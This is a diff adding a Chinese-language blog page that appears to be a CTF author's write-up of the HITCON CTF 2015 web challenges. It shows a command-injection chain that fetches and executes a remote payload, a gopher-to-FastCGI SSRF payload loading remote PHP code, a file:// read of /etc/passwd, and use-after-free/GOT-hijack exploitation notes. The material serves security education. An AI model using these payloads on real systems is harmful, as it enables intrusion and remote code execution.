@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="當初好像沒留底稿只發布在 Facebook 跟烏雲，今天睡醒發現又有人在轉貼這篇，想說留個備份好了XD  Facebook 連結 Wooyun 知識庫連結 HITCON KnowledgeBase 連結  決賽 Attack &amp; Defense 也出了一道 Web 題目，0ops 成員 5alt 也寫了一篇筆記 HITCON CTF 2015 Final Webful Writeup。 寫">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON CTF 2015 Quals &amp; Final 心得備份">
+<meta property="og:url" content="http://blog.orange.tw/posts/2016-01-hitcon-ctf-2015-quals-final/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="當初好像沒留底稿只發布在 Facebook 跟烏雲，今天睡醒發現又有人在轉貼這篇，想說留個備份好了XD  Facebook 連結 Wooyun 知識庫連結 HITCON KnowledgeBase 連結  決賽 Attack &amp; Defense 也出了一道 Web 題目，0ops 成員 5alt 也寫了一篇筆記 HITCON CTF 2015 Final Webful Writeup。 寫">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2016-01-13T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-21T06:09:31.362Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>HITCON CTF 2015 Quals &amp; Final 心得備份 | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Orange Tsai</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HITCON CTF 2015 Quals &amp; Final 心得備份
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2016-01-13T16:00:00.000Z" class="dt-published" itemprop="datePublished">2016-01-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>當初好像沒留底稿只發布在 Facebook 跟烏雲，今天睡醒發現又有人在轉貼這篇，想說留個備份好了XD</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.facebook.com/notes/orange-tsai/hitcon-ctf-2015-quals-web-%E5%87%BA%E9%A1%8C%E5%BF%83%E5%BE%97/10153638014065460?notif_t=like">Facebook 連結</a></li>
+<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/web/9845">Wooyun 知識庫連結</a></li>
+<li><a target="_blank" rel="noopener" href="http://kb.hitcon.org/post/131488130087/hitcon-ctf-2015-quals-web-%E5%87%BA%E9%A1%8C%E5%BF%83%E5%BE%97">HITCON KnowledgeBase 連結</a></li>
+</ul>
+<p>決賽 Attack &amp; Defense 也出了一道 Web 題目，0ops 成員 5alt 也寫了一篇筆記 <a target="_blank" rel="noopener" href="http://5alt.me/posts/2015/12/HITCON%20CTF%202015%20Final%20Webful%20Writeup.html">HITCON CTF 2015 Final Webful Writeup</a>。 寫的真棒XD 看得我自己心癢癢都想寫一篇來解釋各個洞為什麼要這樣設計了XD</p>
+<p>出 Final 時候本意就是要把環境模擬成真實環境，讓平常 Web 狗的各種猥瑣流可以得心應手而不是淪為解題形式在實戰中派不上用場，除了各個 API 接口的互相影響<strong>單點淪陷 &#x3D; 全部淪陷</strong>外，還有模擬 Discuz UC_KEY 的應用，SECRET_KEY 洩漏的各種利用方式順便防止 Replay，裡面的 VIM 備份檔下載也是隨著題目應運而生出現的洞XD<br>（看了你才知道真實世界中為什麼會出現這樣的洞）</p>
+<p>最後預料之外的是，本來想說大家都是世界等級的隊伍修漏洞應該很快，所以本來預期最後大家都是去繞各個隊伍的 WAF ，不過看來有點太坑了XD</p>
+<h1 id="寫在-HITCON-CTF-2015-Quals-之後"><a href="#寫在-HITCON-CTF-2015-Quals-之後" class="headerlink" title="寫在 HITCON CTF 2015 Quals 之後"></a>寫在 HITCON CTF 2015 Quals 之後</h1><p>作為出題團隊的一員，不得不說這次的難度真的不是有點高而已XD 不過就身為 DEFCON 種子賽我覺得可以說是名符其實! :)  </p>
+<p>這次負責了所有的 Web 題目，私心來說都是自信之作，把自己最近研究的一些東西出成題目XD  就參賽者反應來說，讓他們在解題時覺得很難但解出後會有「原來如此」、「還可以這樣玩」的感覺是我這次主要出題的目的XD </p>
+<p>p.s. 相關代碼皆放在 Github 上，有興趣研究之同學可以先看看代碼嘗試解解看後在敘述!  </p>
+<h2 id="1-100-BabyFirst-33-隊解"><a href="#1-100-BabyFirst-33-隊解" class="headerlink" title="1. 100 BabyFirst (33 隊解)"></a>1. 100 BabyFirst (33 隊解)</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/orangetw/cb3487e47d7aaaea4692">https://gist.github.com/orangetw/cb3487e47d7aaaea4692</a></p>
+</blockquote>
+<p>作為本次 Web 最簡單的題目，純代碼分析並且只有十五行程式碼而已，在比賽開始後兩小時才有人解出  。</p>
+<p>簡單使用 <code>\n</code> 就可以繞過常見正規表示式沒有 match multiline 的問題，不過難點在於可以 Command Injection 但是指令都限制在是 <code>a-zA-Z0-9_ </code> ，這也是最有趣的地方，每個隊伍的想法都不一樣所以會有很多種解法!  </p>
+<p>自己的官方解法是  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir orange</span><br><span class="line">cd orange</span><br><span class="line">wget HEXED_IP</span><br><span class="line">tar cvf payload orange</span><br><span class="line">php payload</span><br></pre></td></tr></table></figure>
+
+
+<p>就可以任意代碼執行 ，從 log 中有看到其他隊伍的解法是  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">busybox ftpget ...  </span><br></pre></td></tr></table></figure>
+
+<p>或是  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">twistd telnet ...  </span><br></pre></td></tr></table></figure>
+
+<p>或是  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget HEX_IP</span><br><span class="line">// 給個 302 Redirect 到 FTP protocol 上，也是這題解法中最訝異的XD</span><br><span class="line">// 本來還檢查過 wget source code 想說產生的 index.html 應該不可控，結果居然到 FTP Protocol 上竟然就可以控  </span><br></pre></td></tr></table></figure>
+
+<p>總體來講也看到各種玩 Command Line 的極限XD 學到滿多用法的，做為出題者來講我覺得是最成功的一題，簡單好玩又有趣!  </p>
+<h2 id="2-200-nanana-18-隊解"><a href="#2-200-nanana-18-隊解" class="headerlink" title="2. 200 nanana (18 隊解)"></a>2. 200 nanana (18 隊解)</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/orangetw/4942d949134227eedd4c">https://gist.github.com/orangetw/4942d949134227eedd4c</a></p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -r -p nanana.xxd &gt; nanana</span><br></pre></td></tr></table></figure>
+
+
+<p>名為 Web 實際上卻是 Pwn 的題目，只提供 binary 並無提供 <code>libcgid.so</code> 所以必須在沒有 library 的狀況下解決這題!</p>
+<p>簡單的 Format String 但沒有 output (sprintf)，把 do_job 的 GOT 換成 system 的 PLT 地址就可以，不過唯一要注意的是得先利用 stack guard 覆蓋 stack smashing detected 的 <code>ARGV[1]</code> 的方式達成任意地址洩漏把 password 給洩漏出來才比較好利用，但是因為 64-bits 且送的東西無法有 NULL Byte 所以在蓋 <code>ARGV[1]</code> 的時候必須用比較迂迴的方式蓋  </p>
+<ul>
+<li>先使用 username 把 <code>ARGV[1]</code> 最後一個蓋 0  </li>
+<li>再使用 username 把 <code>ARGV[1]</code> 倒數第二個蓋 0  </li>
+<li>之後 job 蓋記憶體位置(0x601090)三個 bytes 後剩下的五個 bytes 才會剛好是 0 可以任意地址讀取</li>
+</ul>
+<p>詳細 Exploit 可以參考   </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/orangetw/583a73f58d49b1a3fc14">https://gist.github.com/orangetw/583a73f58d49b1a3fc14</a>  </p>
+</blockquote>
+<h2 id="3-300-Giraffe’s-Coffee-16-隊解"><a href="#3-300-Giraffe’s-Coffee-16-隊解" class="headerlink" title="3. 300 Giraffe’s Coffee (16 隊解)"></a>3. 300 Giraffe’s Coffee (16 隊解)</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/orangetw/4a412fb0d49cad0c4ea3">https://gist.github.com/orangetw/4a412fb0d49cad0c4ea3</a>  </p>
+</blockquote>
+<p>也是代碼分析的題目，核心的概念是 PHP 中 PRNG 的預測。 </p>
+<p>由於電腦很難做到真正的 “隨機”，所以現在大部分隨機數的產生都基於 PRNG，在 PHP 中 PRNG 的實現是變形的 Mersenne Twister 演算法!</p>
+<p>在沒有提供 seed 的下 php_mt_rand 會拿當前 pid 以及時間做一些運算當成種子，而這個 seed 是 32-bits 長的，所以是可破解的</p>
+<p>有些人會使用現成的工具來解，但會發現失敗，無法準確的預測 PRNG 是因為當 PHP 在 Apache 下時是使用 prefork 的方式去執行，所以每次的連線都是從已經 fork 好的 process 中挑一個去給你使用，因此無法確定當前的 process PRNG 中 STATE 的狀態是否為第一次，以及每次連線上的 process 也不一定相同所以 STATE 狀態更無法預測 (現成工具只會算 seed 後的第一次來比對)  </p>
+<p>這點可以使用 Keep-Alive 的方式來確保連上的是同一個 process，之後再原本種子的破解上多加上往 STATE 的運算(共有 624 個 STATE) 應該就可以解了!  </p>
+<h2 id="4-400-lalala-2-隊解"><a href="#4-400-lalala-2-隊解" class="headerlink" title="4. 400 lalala (2 隊解)"></a>4. 400 lalala (2 隊解)</h2><p>一個可以給使用者上傳圖片或是提供網址幫你抓起來上傳圖片的服務，核心概念就是透過 302 redirect 去繞過限制實現 SSRF，並且再透過 SSRF 中的 gopher 去利用本地的 FastCGI prtocol 實現遠端代碼執行!</p>
+<p>在抓取圖片的時候可以使用 302 去做 SSRF  (其實很多人在研究 SSRF 的時候都忽略的 302 的妙處)  </p>
+<p>在 SSRF 中可以讀檔:</p>
+<blockquote>
+<p>Location: file:&#x2F;&#x2F;localhost&#x2F;etc&#x2F;passwd</p>
+</blockquote>
+<p>會發現伺服器的架構是使用 Nginx + PHP-FPM，其中 PHP-FPM fastcgi protocol 是以 bind port 的方式跑在本機上。</p>
+<p>在真實世界中，只要發現對方的 PHP FastCGI 是可以外連的話那就可以拿 shell，所以使用 gopher 構造 FastCGI Protocol 訪問本機的 9001 port 就可以任意代碼執行 (使用 PHP_ADMIN_VALUE 把 allow_url_include 設成 on 以及新增 auto_prepend_file 到自己的網站)  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Location: gopher://127.0.0.1:9001/x%01%01i%13%00%08%00%00%00%01%00%00%00%00%00%00%01%04i%13%00%8B%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/_www/index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%09%26PHP_VALUEauto_prepend_file%20%3D%20http%3A//orange.tw/x%01%04i%13%00%00%00%00%01%05i%13%00%00%00%00</span><br></pre></td></tr></table></figure>
+
+
+<p>這題比較有趣的另外一個點是，如果有實作過 SSRF 搭配 gopher 的話，應該會發現  </p>
+<blockquote>
+<p>Java 中的 gopher 只能接受 0x00 - 0x7f<br>libcurl 中的 gopher 只能接受 0x01 - 0xff  </p>
+</blockquote>
+<p>然後本題使用 PHP 中的 curl_exec ，會使用到 libcurl 無法使用 NULL Byte，但是構造 FastCGI Protocol 的話非得有 NULL Byte 不可，後來去研究了一下 libcurl 的原始碼，發現是因為寫得有點問題才不能使用 NULL Byte  </p>
+<p>所以送了一個 commit 過去還被接受了…XD  </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/bagder/curl/commit/5bf36ea30d38b9e00029180ddbab73cab94a2195">https://github.com/bagder/curl/commit/5bf36ea30d38b9e00029180ddbab73cab94a2195</a>  </p>
+</blockquote>
+<p>所以現在新版本的 libcurl &#x2F; curl 應該 gopher 都可以使用 NULL Byte 了XD  </p>
+<h2 id="5-500-Use-After-FLEE-只有-PPP-解出"><a href="#5-500-Use-After-FLEE-只有-PPP-解出" class="headerlink" title="5. 500 Use-After-FLEE (只有 PPP 解出)"></a>5. 500 Use-After-FLEE (只有 PPP 解出)</h2><p>身為 Web 最難題XD  </p>
+<p>許多時候，在做滲透測試時都會遇到，打進一台虛擬主機(hosting)後要去訪問同主機上的其他網站會被 <code>open_basedir</code> 以及 <code>disable_functions</code> 限制住，但 PHP 在歷史上出現過了許許多多的 Memory 上的洞，這題使用到的就是其中一個  ( 出題時 Ubuntu apt-get 預設安裝的 PHP 還是有洞，不過寫這篇文章時好像已經修了XD )  </p>
+<p>漏洞 PoC 的話可參考 80vul 的 PHP Codz Hacking，不過只有 PoC :(  </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/80vul/phpcodz/blob/master/research/pch-034.md">https://github.com/80vul/phpcodz/blob/master/research/pch-034.md</a>  </p>
+</blockquote>
+<p>使用 Use-After-Free 去繞過上面限制，說的好像很簡單，不過在現今作業系統中有很多的保護你必須面對  </p>
+<ol>
+<li>DEP  </li>
+<li>FULL ASLR  </li>
+<li>PIE (Apache 預設全開)  </li>
+<li>FULL RELRO (Apache 預設全開)  </li>
+<li>由於環境在 Apache + mod_php 上，PHP 是以 Library 的形式被載入到 Apache 中，所以再利用難度上會增加(純 CLI 其實很容易 Exploit)，例如要自己處理 Parsing ELF 的動作XD</li>
+</ol>
+<p>不過 PPP 不愧是最強隊伍在比賽結束前一個半小時解出，也是唯一一隊解出的隊伍!  </p>
+<p>不過有點小遺憾的是，因為比賽平台都在 EC2 的 Ubuntu 14.04 64-bits 上，所以對於 libc 的 offset 他們直接拿其他 Pwn 題目的 libc offset 而不是透過算 STRTAB, SYMTAB, JMPREL 來把 offset 找出 :)</p>
+<p>其中 PPP 的 Ricky 利用 ZVAL 結構中把 <code>type</code> 置換成物件，並把 <code>handler</code> 換成 <code>system</code> </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/pwning/public-writeup/blob/master/hitcon2015/web500-use-after-flee/exploit.php">https://github.com/pwning/public-writeup/blob/master/hitcon2015/web500-use-after-flee/exploit.php</a>  </p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">  zvalue_value value;</span><br><span class="line">  zend_uint refcount__gc;</span><br><span class="line">  zend_uchar type;</span><br><span class="line">  zend_uchar is_ref__gc;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+<p>這樣 PHP 內部在處理時發現引用為 0 時會自動做 destruct 把並且把 ZVAL 當成參數丟給 handler ，這時有 8 bytes 的指令長度限制可以用(所以 Ricky 使用 <code>sh /*/a;</code> 的做法來執行指令) 。</p>
+<p>不過如果在 32-bits 下就變成 4 bytes 的長度限制幾乎無法利用XD  比較優雅的做法可以把 GOT Hijacking 把 fopen 換成 system 之後呼叫 fopen 就可以任意指令執行，有興趣的同學可以嘗試寫寫看，並且把 Exploit 寫到完美! :P  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">write</span>(<span class="variable">$open_got</span>, <span class="variable">$system_address</span>);</span><br><span class="line">  <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;| <span class="subst">$cmd</span>&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+<p>寫到這裡，在 Web Security 的領域上有太多太多的 tricks 以及問題等待著我們去解決  </p>
+<p>身為一個 Web 狗，我很驕傲 :)   </p>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
